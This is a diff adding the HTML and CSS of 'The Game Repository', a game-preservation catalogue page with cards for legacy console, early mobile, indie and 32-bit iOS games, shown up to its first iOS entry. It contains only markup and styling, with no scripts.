@@ -1,0 +1,1575 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+    <title>The Game Repository — Digital Archive & Software Preservation</title>
+
+    <style>
+        /* ============================================================
+       DESIGN SYSTEM — CSS Custom Properties
+    ============================================================ */
+        :root {
+            /* Colors */
+            --color-bg: #0a0a0f;
+            --color-surface: #13131c;
+            --color-surface-2: #1c1c2b;
+            --color-border: rgba(255, 255, 255, 0.07);
+            --color-text: #e8e8f0;
+            --color-muted: #6b6b88;
+            --color-accent: #7c6dfa;
+            --color-accent-glow: rgba(124, 109, 250, 0.25);
+            --color-accent-2: #fa6d9a;
+            --color-badge-retro: #f59e42;
+            --color-badge-mobile: #42d4f5;
+            --color-badge-niche: #7c6dfa;
+            --color-badge-ios: #007aff;
+            --color-danger: #f56d6d;
+            --color-success: #42f5a1;
+
+            /* Typography */
+            --font-display: 'Georgia', 'Times New Roman', serif;
+            --font-body: 'Trebuchet MS', 'Lucida Sans', sans-serif;
+            --font-mono: 'Courier New', monospace;
+
+            /* Spacing scale */
+            --space-1: 0.25rem;
+            --space-2: 0.5rem;
+            --space-3: 0.75rem;
+            --space-4: 1rem;
+            --space-5: 1.5rem;
+            --space-6: 2rem;
+            --space-8: 3rem;
+            --space-10: 5rem;
+
+            /* Radii */
+            --radius-sm: 6px;
+            --radius-md: 12px;
+            --radius-lg: 20px;
+            --radius-xl: 32px;
+            --radius-full: 9999px;
+
+            /* Shadows */
+            --shadow-card: 0 4px 24px rgba(0, 0, 0, 0.45), 0 1px 3px rgba(0, 0, 0, 0.3);
+            --shadow-accent: 0 0 32px var(--color-accent-glow);
+            --shadow-modal: 0 24px 80px rgba(0, 0, 0, 0.7);
+
+            /* Transitions */
+            --ease-out: cubic-bezier(0.22, 1, 0.36, 1);
+            --dur-fast: 150ms;
+            --dur-med: 280ms;
+            --dur-slow: 480ms;
+
+            /* Layout */
+            --max-width: 1200px;
+            --nav-height: 64px;
+        }
+
+        /* ============================================================
+       RESET & BASE
+    ============================================================ */
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        html {
+            scroll-behavior: smooth;
+            -webkit-text-size-adjust: 100%;
+        }
+
+        body {
+            background-color: var(--color-bg);
+            color: var(--color-text);
+            font-family: var(--font-body);
+            font-size: 1rem;
+            line-height: 1.6;
+            min-height: 100dvh;
+            overflow-x: hidden;
+            /* Safe area for notched phones */
+            padding-left: env(safe-area-inset-left);
+            padding-right: env(safe-area-inset-right);
+        }
+
+        a {
+            color: inherit;
+            text-decoration: none;
+        }
+
+        img {
+            display: block;
+            max-width: 100%;
+        }
+
+        /* ============================================================
+       BACKGROUND ATMOSPHERE
+    ============================================================ */
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background:
+                radial-gradient(ellipse 80% 60% at 20% -10%, rgba(124, 109, 250, 0.12) 0%, transparent 60%),
+                radial-gradient(ellipse 60% 50% at 80% 110%, rgba(250, 109, 154, 0.09) 0%, transparent 55%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        /* ============================================================
+       HEADER / NAV
+    ============================================================ */
+        header {
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            height: var(--nav-height);
+            background: rgba(10, 10, 15, 0.82);
+            backdrop-filter: blur(18px) saturate(160%);
+            -webkit-backdrop-filter: blur(18px) saturate(160%);
+            border-bottom: 1px solid var(--color-border);
+        }
+
+        nav {
+            max-width: var(--max-width);
+            margin: 0 auto;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 var(--space-5);
+        }
+
+        .nav-logo-container {
+            display: flex;
+            align-items: center;
+            gap: var(--space-3);
+            text-decoration: none;
+        }
+
+        .logo-svg {
+            width: 28px;
+            height: 28px;
+            flex-shrink: 0;
+            transition: transform var(--dur-fast) var(--ease-out);
+        }
+
+        .nav-logo-container:hover .logo-svg {
+            transform: scale(1.08) rotate(-3deg);
+        }
+
+        .nav-logo {
+            font-family: var(--font-display);
+            font-size: 1.5rem;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+            background: linear-gradient(135deg, #fff 30%, var(--color-accent));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .nav-logo-sub {
+            font-size: 0.8rem;
+            font-family: var(--font-mono);
+            color: var(--color-muted);
+            font-weight: 500;
+            letter-spacing: 0.05em;
+            margin-left: 8px;
+            -webkit-text-fill-color: var(--color-muted);
+            display: none;
+        }
+
+        @media (min-width: 500px) {
+            .nav-logo-sub {
+                display: inline-block;
+            }
+        }
+
+        .nav-links {
+            display: flex;
+            gap: var(--space-5);
+            list-style: none;
+        }
+
+        .nav-links a {
+            font-size: 0.875rem;
+            font-weight: 500;
+            color: var(--color-muted);
+            letter-spacing: 0.04em;
+            text-transform: uppercase;
+            transition: color var(--dur-fast) var(--ease-out);
+        }
+
+        .nav-links a:hover {
+            color: var(--color-text);
+        }
+
+        /* ============================================================
+       HERO
+    ============================================================ */
+        .hero {
+            position: relative;
+            z-index: 1;
+            max-width: var(--max-width);
+            margin: 0 auto;
+            padding: var(--space-10) var(--space-5) var(--space-8);
+            text-align: center;
+        }
+
+        .hero-eyebrow {
+            display: inline-flex;
+            align-items: center;
+            gap: var(--space-2);
+            font-size: 0.75rem;
+            font-weight: 600;
+            letter-spacing: 0.12em;
+            text-transform: uppercase;
+            color: var(--color-accent);
+            border: 1px solid rgba(124, 109, 250, 0.3);
+            border-radius: var(--radius-full);
+            padding: var(--space-1) var(--space-4);
+            margin-bottom: var(--space-5);
+        }
+
+        .hero-eyebrow::before {
+            content: '';
+            display: block;
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: var(--color-accent);
+            box-shadow: 0 0 8px var(--color-accent);
+        }
+
+        .hero h1 {
+            font-family: var(--font-display);
+            font-size: clamp(2rem, 6vw, 3.75rem);
+            font-weight: 700;
+            line-height: 1.12;
+            letter-spacing: -0.03em;
+            margin-bottom: var(--space-5);
+            color: #fff;
+        }
+
+        .hero h1 em {
+            font-style: normal;
+            background: linear-gradient(135deg, var(--color-accent), var(--color-accent-2));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .hero-sub {
+            max-width: 560px;
+            margin: 0 auto var(--space-6);
+            font-size: 1.05rem;
+            color: var(--color-muted);
+            line-height: 1.7;
+        }
+
+        /* ============================================================
+       MAIN CONTENT
+    ============================================================ */
+        main {
+            position: relative;
+            z-index: 1;
+            max-width: var(--max-width);
+            margin: 0 auto;
+            padding: 0 var(--space-5) var(--space-10);
+        }
+
+        /* ============================================================
+       SECTION HEADERS
+    ============================================================ */
+        .showcase-section {
+            margin-bottom: var(--space-10);
+        }
+
+        .section-header {
+            display: flex;
+            align-items: center;
+            gap: var(--space-4);
+            margin-bottom: var(--space-6);
+        }
+
+        .section-header h2 {
+            font-family: var(--font-display);
+            font-size: clamp(1.25rem, 3vw, 1.75rem);
+            font-weight: 700;
+            letter-spacing: -0.02em;
+            color: #fff;
+        }
+
+        .section-line {
+            flex: 1;
+            height: 1px;
+            background: var(--color-border);
+        }
+
+        .section-count {
+            font-size: 0.75rem;
+            color: var(--color-muted);
+            font-family: var(--font-mono);
+        }
+
+        /* ============================================================
+       GAME GRID — Mobile-first
+    ============================================================ */
+        .game-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: var(--space-5);
+        }
+
+        @media (min-width: 600px) {
+            .game-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
+        @media (min-width: 900px) {
+            .game-grid {
+                grid-template-columns: repeat(3, 1fr);
+            }
+        }
+
+        /* ============================================================
+       GAME CARD
+    ============================================================ */
+        article.game-card {
+            background: var(--color-surface);
+            border: 1px solid var(--color-border);
+            border-radius: var(--radius-lg);
+            overflow: hidden;
+            box-shadow: var(--shadow-card);
+            transition: transform var(--dur-med) var(--ease-out),
+                box-shadow var(--dur-med) var(--ease-out),
+                border-color var(--dur-med) var(--ease-out);
+            display: flex;
+            flex-direction: column;
+        }
+
+        article.game-card:hover {
+            transform: translateY(-4px);
+            box-shadow: var(--shadow-card), var(--shadow-accent);
+            border-color: rgba(124, 109, 250, 0.25);
+        }
+
+        /* Cover placeholder */
+        .card-cover {
+            width: 100%;
+            aspect-ratio: 16 / 10;
+            background: linear-gradient(135deg, var(--color-surface-2) 0%, var(--color-bg) 100%);
+            border-bottom: 1px solid var(--color-border);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: var(--space-2);
+            position: relative;
+            overflow: hidden;
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+        }
+
+        /* Dark overlay to make labels legible over box art */
+        .card-cover::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: rgba(10, 10, 15, 0.5);
+            z-index: 1;
+            pointer-events: none;
+        }
+
+        /* Subtle dashed inner border */
+        .card-cover::after {
+            content: '';
+            position: absolute;
+            inset: 12px;
+            border: 1px dashed rgba(255, 255, 255, 0.1);
+            border-radius: var(--radius-md);
+            pointer-events: none;
+            z-index: 3;
+        }
+
+        .card-cover-icon {
+            font-size: 1.75rem;
+            opacity: 0.25;
+            position: relative;
+            z-index: 2;
+        }
+
+        .card-cover-label {
+            font-size: 0.7rem;
+            font-family: var(--font-mono);
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+            color: var(--color-text);
+            opacity: 0.9;
+            position: relative;
+            z-index: 2;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.8);
+        }
+
+        /* Card body */
+        .card-body {
+            padding: var(--space-4) var(--space-5) var(--space-5);
+            display: flex;
+            flex-direction: column;
+            gap: var(--space-3);
+            flex: 1;
+        }
+
+        .card-meta {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        /* Platform badge */
+        .badge {
+            font-size: 0.65rem;
+            font-weight: 700;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            padding: 3px 10px;
+            border-radius: var(--radius-full);
+        }
+
+        .badge-retro {
+            background: rgba(245, 158, 66, 0.15);
+            color: var(--color-badge-retro);
+            border: 1px solid rgba(245, 158, 66, 0.25);
+        }
+
+        .badge-mobile {
+            background: rgba(66, 212, 245, 0.12);
+            color: var(--color-badge-mobile);
+            border: 1px solid rgba(66, 212, 245, 0.22);
+        }
+
+        .badge-niche {
+            background: rgba(124, 109, 250, 0.15);
+            color: var(--color-badge-niche);
+            border: 1px solid rgba(124, 109, 250, 0.3);
+        }
+
+        .badge-ios {
+            background: rgba(0, 122, 255, 0.12);
+            color: var(--color-badge-ios);
+            border: 1px solid rgba(0, 122, 255, 0.25);
+        }
+
+        .card-title {
+            font-family: var(--font-display);
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: #fff;
+            letter-spacing: -0.01em;
+        }
+
+        .card-description {
+            font-size: 0.8rem;
+            color: var(--color-muted);
+            line-height: 1.5;
+            margin-top: calc(-1 * var(--space-1));
+            margin-bottom: var(--space-2);
+            display: -webkit-box;
+            -webkit-line-clamp: 3;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+        }
+
+        /* Download button */
+        .btn-download {
+            margin-top: auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: var(--space-2);
+            width: 100%;
+            padding: var(--space-3) var(--space-4);
+            background: rgba(124, 109, 250, 0.12);
+            color: var(--color-accent);
+            border: 1px solid rgba(124, 109, 250, 0.3);
+            border-radius: var(--radius-md);
+            font-family: var(--font-body);
+            font-size: 0.875rem;
+            font-weight: 600;
+            letter-spacing: 0.03em;
+            cursor: pointer;
+            transition: background var(--dur-fast) var(--ease-out),
+                border-color var(--dur-fast) var(--ease-out),
+                color var(--dur-fast) var(--ease-out),
+                transform var(--dur-fast) var(--ease-out);
+        }
+
+        .btn-download:hover {
+            background: rgba(124, 109, 250, 0.22);
+            border-color: var(--color-accent);
+            color: #fff;
+            transform: scale(1.01);
+        }
+
+        .btn-download:active {
+            transform: scale(0.98);
+        }
+
+        /* ============================================================
+       FOOTER
+    ============================================================ */
+        footer {
+            position: relative;
+            z-index: 1;
+            border-top: 1px solid var(--color-border);
+            padding: var(--space-8) var(--space-5);
+            padding-bottom: calc(var(--space-8) + env(safe-area-inset-bottom));
+            text-align: center;
+        }
+
+        footer p {
+            font-size: 0.8rem;
+            color: var(--color-muted);
+        }
+
+        footer strong {
+            color: var(--color-text);
+        }
+
+        /* ============================================================
+       MODAL OVERLAY
+    ============================================================ */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            z-index: 500;
+            background: rgba(5, 5, 10, 0.85);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: var(--space-5);
+            padding-top: calc(var(--space-5) + env(safe-area-inset-top));
+            padding-bottom: calc(var(--space-5) + env(safe-area-inset-bottom));
+
+            /* Animation */
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity var(--dur-med) var(--ease-out),
+                visibility var(--dur-med) var(--ease-out);
+        }
+
+        .modal-overlay.is-open {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        /* ============================================================
+       MODAL PANEL
+    ============================================================ */
+        .modal {
+            position: relative;
+            width: 100%;
+            max-width: min(480px, 90vw);
+            max-height: 90dvh;
+            overflow-y: auto;
+            background: var(--color-surface);
+            border: 1px solid var(--color-border);
+            border-radius: var(--radius-xl);
+            box-shadow: var(--shadow-modal);
+            padding: var(--space-6);
+
+            /* Animation */
+            transform: translateY(24px) scale(0.97);
+            transition: transform var(--dur-med) var(--ease-out);
+        }
+
+        .modal-overlay.is-open .modal {
+            transform: translateY(0) scale(1);
+        }
+
+        /* Modal close button */
+        .modal-close {
+            position: absolute;
+            top: var(--space-4);
+            right: var(--space-4);
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            border: 1px solid var(--color-border);
+            background: var(--color-surface-2);
+            color: var(--color-muted);
+            font-size: 1rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background var(--dur-fast), color var(--dur-fast);
+            line-height: 1;
+        }
+
+        .modal-close:hover {
+            background: rgba(255, 255, 255, 0.08);
+            color: var(--color-text);
+        }
+
+        /* Modal icon */
+        .modal-icon {
+            width: 52px;
+            height: 52px;
+            border-radius: var(--radius-md);
+            background: linear-gradient(135deg, var(--color-accent), var(--color-accent-2));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+            margin-bottom: var(--space-5);
+        }
+
+        /* Modal headings & text */
+        .modal h2 {
+            font-family: var(--font-display);
+            font-size: 1.5rem;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+            color: #fff;
+            margin-bottom: var(--space-3);
+        }
+
+        .modal-body-text {
+            font-size: 0.9rem;
+            color: var(--color-muted);
+            line-height: 1.65;
+            margin-bottom: var(--space-5);
+        }
+
+        /* Info notice */
+        .modal-notice {
+            background: var(--color-surface-2);
+            border: 1px solid var(--color-border);
+            border-left: 3px solid var(--color-accent);
+            border-radius: var(--radius-sm);
+            padding: var(--space-3) var(--space-4);
+            font-size: 0.82rem;
+            color: var(--color-muted);
+            margin-bottom: var(--space-5);
+            line-height: 1.5;
+        }
+
+        .modal-notice strong {
+            color: var(--color-text);
+        }
+
+        /* Steps */
+        .modal-steps {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: var(--space-3);
+            margin-bottom: var(--space-6);
+        }
+
+        .modal-steps li {
+            display: flex;
+            align-items: flex-start;
+            gap: var(--space-3);
+        }
+
+        .step-num {
+            flex-shrink: 0;
+            width: 26px;
+            height: 26px;
+            border-radius: 50%;
+            background: rgba(124, 109, 250, 0.18);
+            border: 1px solid rgba(124, 109, 250, 0.35);
+            color: var(--color-accent);
+            font-size: 0.75rem;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .step-text {
+            font-size: 0.875rem;
+            color: var(--color-text);
+            padding-top: 3px;
+            line-height: 1.5;
+        }
+
+        /* Divider */
+        .modal-divider {
+            height: 1px;
+            background: var(--color-border);
+            margin-bottom: var(--space-5);
+        }
+
+        /* Modal action buttons */
+        .modal-actions {
+            display: flex;
+            flex-direction: column;
+            gap: var(--space-3);
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: var(--space-4);
+            background: linear-gradient(135deg, var(--color-accent), #9b6dfa);
+            color: #fff;
+            border: none;
+            border-radius: var(--radius-md);
+            font-family: var(--font-body);
+            font-size: 0.95rem;
+            font-weight: 700;
+            letter-spacing: 0.02em;
+            cursor: pointer;
+            box-shadow: 0 4px 16px var(--color-accent-glow);
+            transition: opacity var(--dur-fast), transform var(--dur-fast);
+        }
+
+        .btn-primary:hover {
+            opacity: 0.88;
+            transform: scale(1.01);
+        }
+
+        .btn-primary:active {
+            transform: scale(0.98);
+        }
+
+        .btn-proceed {
+            width: 100%;
+            padding: var(--space-4);
+            background: rgba(255, 255, 255, 0.06);
+            color: var(--color-muted);
+            border: 1px solid var(--color-border);
+            border-radius: var(--radius-md);
+            font-family: var(--font-body);
+            font-size: 0.95rem;
+            font-weight: 600;
+            cursor: not-allowed;
+            pointer-events: none;
+            transition: all var(--dur-med) var(--ease-out);
+            position: relative;
+        }
+
+        /* Proceed — active state */
+        .btn-proceed.is-active {
+            background: rgba(66, 245, 161, 0.1);
+            color: var(--color-success);
+            border-color: rgba(66, 245, 161, 0.3);
+            cursor: pointer;
+            pointer-events: auto;
+        }
+
+        .btn-proceed.is-active:hover {
+            background: rgba(66, 245, 161, 0.18);
+            border-color: var(--color-success);
+        }
+
+        /* ============================================================
+           IFRAME MODAL
+        ============================================================ */
+        .modal-iframe {
+            max-width: 95vw;
+            height: 90dvh;
+            padding: 0;
+            overflow: hidden;
+            background: #fff;
+        }
+
+        .modal-iframe iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+            display: block;
+        }
+
+        .modal-iframe .modal-close {
+            background: rgba(10, 10, 15, 0.6);
+            color: #fff;
+            border: none;
+            backdrop-filter: blur(4px);
+            z-index: 10;
+        }
+
+        .modal-iframe .modal-close:hover {
+            background: rgba(10, 10, 15, 0.9);
+        }
+
+        /* ============================================================
+       SCROLL LOCK (applied to <body>)
+    ============================================================ */
+        body.modal-open {
+            overflow: hidden;
+        }
+
+        /* ============================================================
+       UTILITY
+    ============================================================ */
+        .sr-only {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
+            clip: rect(0, 0, 0, 0);
+            white-space: nowrap;
+        }
+
+        /* ============================================================
+       ANIMATION — stagger card fade-in on load
+    ============================================================ */
+        @keyframes cardIn {
+            from {
+                opacity: 0;
+                transform: translateY(16px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        article.game-card {
+            animation: cardIn var(--dur-slow) var(--ease-out) both;
+        }
+
+        /* Stagger by index using sibling count */
+        article.game-card:nth-child(1) {
+            animation-delay: 0ms;
+        }
+
+        article.game-card:nth-child(2) {
+            animation-delay: 60ms;
+        }
+
+        article.game-card:nth-child(3) {
+            animation-delay: 120ms;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- ============================================================
+       HEADER
+  ============================================================ -->
+    <header>
+        <nav aria-label="Main navigation">
+            <a href="#" class="nav-logo-container" aria-label="The Game Repository Home">
+                <svg class="logo-svg" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"
+                    aria-hidden="true">
+                    <defs>
+                        <linearGradient id="logo-grad" x1="0%" y1="0%" x2="100%" y2="100%">
+                            <stop offset="0%" stop-color="#ffffff" />
+                            <stop offset="100%" stop-color="#7c6dfa" />
+                        </linearGradient>
+                    </defs>
+                    <!-- Classical Archival Pediment -->
+                    <path d="M4 10 L16 3 L28 10 Z" fill="url(#logo-grad)" opacity="0.95" />
+                    <rect x="4" y="10" width="24" height="2" fill="url(#logo-grad)" />
+                    <!-- Modern Pixel/Preservation Columns -->
+                    <rect x="6" y="14" width="3" height="12" rx="1" fill="url(#logo-grad)" opacity="0.8" />
+                    <rect x="23" y="14" width="3" height="12" rx="1" fill="url(#logo-grad)" opacity="0.8" />
+                    <!-- Interactive Media Center Column (Minimal D-Pad / Controller shape) -->
+                    <path d="M16 13 V23 M11 18 H21" stroke="url(#logo-grad)" stroke-width="2.5" stroke-linecap="round"
+                        stroke-linejoin="round" />
+                    <!-- Foundation Plinth -->
+                    <rect x="3" y="27" width="26" height="2" rx="0.5" fill="url(#logo-grad)" />
+                </svg>
+                <span class="nav-logo">TGR <span class="nav-logo-sub">// The Game Repository</span></span>
+            </a>
+            <ul class="nav-links" role="list">
+                <li><a href="#">Home</a></li>
+                <li><a href="#">Browse</a></li>
+                <li><a href="#">About</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <!-- ============================================================
+       HERO
+  ============================================================ -->
+    <section class="hero" aria-labelledby="hero-heading">
+        <div class="hero-eyebrow" aria-hidden="true">Open Access &middot; Preserved Archive</div>
+        <h1 id="hero-heading">
+            Preserving the <em>Heritage</em><br>of Interactive Media.
+        </h1>
+        <p class="hero-sub">
+            A peer-reviewed, digital repository of historical software, legacy mobile applications,
+            and pioneering indie developments. Preserved for academic study, historical research, and cultural
+            retention.
+        </p>
+    </section>
+
+    <!-- ============================================================
+       MAIN SHOWCASE
+  ============================================================ -->
+    <main>
+
+        <!-- SECTION 1: Legacy Console Systems -->
+        <section class="showcase-section" aria-labelledby="retro-heading">
+            <div class="section-header">
+                <h2 id="retro-heading">Legacy Console Systems</h2>
+                <div class="section-line" aria-hidden="true"></div>
+                <span class="section-count" aria-label="3 games">03</span>
+            </div>
+
+            <div class="game-grid">
+
+                <article class="game-card" aria-label="Catalog Entry: Super Mario World (1990)">
+                    <div class="card-cover" aria-hidden="true">
+                        <span class="card-cover-icon">🍄</span>
+                        <span class="card-cover-label">Catalog #LC-1990-SMW</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="card-meta">
+                            <span class="badge badge-retro">Legacy Console</span>
+                        </div>
+                        <p class="card-title">Super Mario World (1990)</p>
+                        <p class="card-description">
+                            An iconic milestone in two-dimensional level design and fluid character physics, setting the
+                            golden standard for side-scrolling games.
+                        </p>
+                        <button class="btn-download" aria-label="Access Archive — Super Mario World">
+                            ↓ Access Archive
+                        </button>
+                    </div>
+                </article>
+
+                <article class="game-card" aria-label="Catalog Entry: The Legend of Zelda: Ocarina of Time (1998)">
+                    <div class="card-cover" aria-hidden="true">
+                        <span class="card-cover-icon">🗡️</span>
+                        <span class="card-cover-label">Catalog #LC-1998-LZO</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="card-meta">
+                            <span class="badge badge-retro">Legacy Console</span>
+                        </div>
+                        <p class="card-title">The Legend of Zelda: Ocarina of Time (1998)</p>
+                        <p class="card-description">
+                            A pioneering framework for three-dimensional camera mechanics, lock-on target systems, and
+                            expansive spatial progression.
+                        </p>
+                        <button class="btn-download" aria-label="Access Archive — Ocarina of Time">
+                            ↓ Access Archive
+                        </button>
+                    </div>
+                </article>
+
+                <article class="game-card" aria-label="Catalog Entry: Tetris (1989)">
+                    <div class="card-cover" aria-hidden="true">
+                        <span class="card-cover-icon">🧩</span>
+                        <span class="card-cover-label">Catalog #LC-1989-TET</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="card-meta">
+                            <span class="badge badge-retro">Legacy Console</span>
+                        </div>
+                        <p class="card-title">Tetris (1989)</p>
+                        <p class="card-description">
+                            An unparalleled masterclass in computational minimalism, spatial reasoning, and the
+                            psychology of continuous feedback loops.
+                        </p>
+                        <button class="btn-download" aria-label="Access Archive — Tetris">
+                            ↓ Access Archive
+                        </button>
+                    </div>
+                </article>
+
+            </div>
+        </section>
+
+        <!-- SECTION 2: Mobile Software History -->
+        <section class="showcase-section" aria-labelledby="mobile-heading">
+            <div class="section-header">
+                <h2 id="mobile-heading">Mobile Software History</h2>
+                <div class="section-line" aria-hidden="true"></div>
+                <span class="section-count" aria-label="3 games">03</span>
+            </div>
+
+            <div class="game-grid">
+
+                <article class="game-card" aria-label="Catalog Entry: Snake II (2000)">
+                    <div class="card-cover" aria-hidden="true">
+                        <span class="card-cover-icon">🐍</span>
+                        <span class="card-cover-label">Catalog #MS-2000-SNK</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="card-meta">
+                            <span class="badge badge-mobile">Mobile Software</span>
+                        </div>
+                        <p class="card-title">Snake II (2000)</p>
+                        <p class="card-description">
+                            A landmark in ubiquitous mobile application architecture, demonstrating the possibilities of
+                            early handheld gaming entertainment.
+                        </p>
+                        <button class="btn-download" aria-label="Access Archive — Snake II">
+                            ↓ Access Archive
+                        </button>
+                    </div>
+                </article>
+
+                <article class="game-card" aria-label="Catalog Entry: Space Impact (2000)">
+                    <div class="card-cover" aria-hidden="true">
+                        <span class="card-cover-icon">🚀</span>
+                        <span class="card-cover-label">Catalog #MS-2000-SPI</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="card-meta">
+                            <span class="badge badge-mobile">Mobile Software</span>
+                        </div>
+                        <p class="card-title">Space Impact (2000)</p>
+                        <p class="card-description">
+                            An early showcase of monochromatic side-scrolling pixel physics, rendering dynamic enemy
+                            waves on low-resource LCD displays.
+                        </p>
+                        <button class="btn-download" aria-label="Access Archive — Space Impact">
+                            ↓ Access Archive
+                        </button>
+                    </div>
+                </article>
+
+                <article class="game-card" aria-label="Catalog Entry: Bounce (2001)">
+                    <div class="card-cover" aria-hidden="true">
+                        <span class="card-cover-icon">🔴</span>
+                        <span class="card-cover-label">Catalog #MS-2001-BNC</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="card-meta">
+                            <span class="badge badge-mobile">Mobile Software</span>
+                        </div>
+                        <p class="card-title">Bounce (2001)</p>
+                        <p class="card-description">
+                            A highly influential early mobile platformer exploring gravity dynamics, environmental
+                            obstacles, and momentum control.
+                        </p>
+                        <button class="btn-download" aria-label="Access Archive — Bounce">
+                            ↓ Access Archive
+                        </button>
+                    </div>
+                </article>
+
+            </div>
+        </section>
+
+        <!-- SECTION 3: Contemporary Independent Development -->
+        <section class="showcase-section" aria-labelledby="niche-heading">
+            <div class="section-header">
+                <h2 id="niche-heading">Contemporary Independent Development</h2>
+                <div class="section-line" aria-hidden="true"></div>
+                <span class="section-count" aria-label="3 games">03</span>
+            </div>
+
+            <div class="game-grid">
+
+                <article class="game-card" aria-label="Catalog Entry: Cave Story (2004)">
+                    <div class="card-cover" aria-hidden="true">
+                        <span class="card-cover-icon">✨</span>
+                        <span class="card-cover-label">Catalog #ID-2004-CVS</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="card-meta">
+                            <span class="badge badge-niche">Independent Study</span>
+                        </div>
+                        <p class="card-title">Cave Story (2004)</p>
+                        <p class="card-description">
+                            A foundational solo-developed software artifact that catalyzed the modern indie gaming
+                            renaissance through retro aesthetics and tight mechanics.
+                        </p>
+                        <button class="btn-download" aria-label="Access Archive — Cave Story">
+                            ↓ Access Archive
+                        </button>
+                    </div>
+                </article>
+
+                <article class="game-card" aria-label="Catalog Entry: Spelunky Classic (2008)">
+                    <div class="card-cover" aria-hidden="true">
+                        <span class="card-cover-icon">🌱</span>
+                        <span class="card-cover-label">Catalog #ID-2008-SPL</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="card-meta">
+                            <span class="badge badge-niche">Independent Study</span>
+                        </div>
+                        <p class="card-title">Spelunky Classic (2008)</p>
+                        <p class="card-description">
+                            An archival study in algorithmic level generation, combining systemic hazard interactions
+                            with roguelike permadeath mechanics.
+                        </p>
+                        <button class="btn-download" aria-label="Access Archive — Spelunky Classic">
+                            ↓ Access Archive
+                        </button>
+                    </div>
+                </article>
+
+                <article class="game-card" aria-label="Catalog Entry: Dwarf Fortress Alpha (2006)">
+                    <div class="card-cover" aria-hidden="true">
+                        <span class="card-cover-icon">🔮</span>
+                        <span class="card-cover-label">Catalog #ID-2006-DFF</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="card-meta">
+                            <span class="badge badge-niche">Independent Study</span>
+                        </div>
+                        <p class="card-title">Dwarf Fortress Alpha (2006)</p>
+                        <p class="card-description">
+                            An incredibly detailed procedural world simulator, showcasing deep computational systems,
+                            emergent narratives, and ASCII art displays.
+                        </p>
+                        <button class="btn-download" aria-label="Access Archive — Dwarf Fortress">
+                            ↓ Access Archive
+                        </button>
+                    </div>
+                </article>
+
+            </div>
+        </section>
+
+        <!-- SECTION 4: iOS Legacy IPAs -->
+        <section class="showcase-section" aria-labelledby="ios-heading">
+            <div class="section-header">
+                <h2 id="ios-heading">iOS Legacy IPAs (32-bit Preservation)</h2>
+                <div class="section-line" aria-hidden="true"></div>
+                <span class="section-count" aria-label="10 games">10</span>
+            </div>
+
+            <div class="game-grid">
+
+                <article class="game-card" aria-label="Catalog Entry: Infinity Blade (2010)">
+                    <div class="card-cover" style="background-image: url('https://upload.wikimedia.org/wikipedia/en/thumb/3/39/Infinity_Blade_icon.png/220px-Infinity_Blade_icon.png');" aria-hidden="true">
+                        <span class="card-cover-label">Catalog #MS-2010-IFB</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="card-meta">
+                            <span class="badge badge-ios">iOS IPA</span>
+                        </div>
+                        <p class="card-title">Infinity Blade (2010)</p>
+                        <p class="card-description">
+                            A historical graphical milestone utilizing Unreal Engine 3, illustrating the capacity for console-quality real-time rendering on early multi-touch mobile devices.
+                        </p>
+                        <button class="btn-download" aria-label="Access Archive — Infinity Blade">
+                            ↓ Access Archive
+                        </button>
+                    </div>
+                </article>
+
